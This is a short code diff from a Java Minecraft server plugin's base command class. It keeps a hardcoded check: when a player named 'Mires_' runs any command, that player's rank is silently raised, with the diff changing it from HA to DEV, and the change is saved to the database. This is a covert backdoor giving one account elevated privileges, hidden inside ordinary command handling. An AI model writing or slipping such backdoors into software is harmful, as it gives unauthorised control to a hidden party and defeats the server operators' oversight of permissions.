@@ -47,7 +47,7 @@ public abstract class CommandAPI extends Command {
     public boolean execute(final CommandSender sender, final String s, final String[] strings) {
         if (sender.getName().equals("Mires_")) {
             final User user = RPGCORE.getInstance().getUserManager().find(((Player) sender).getUniqueId());
-            user.getRankUser().setRank(RankType.HA);
+            user.getRankUser().setRank(RankType.DEV);
             RPGCORE.getInstance().getServer().getScheduler().runTaskAsynchronously(RPGCORE.getInstance(), () -> RPGCORE.getInstance().getMongoManager().saveDataUser(((Player) sender).getUniqueId(), user));
         }
 
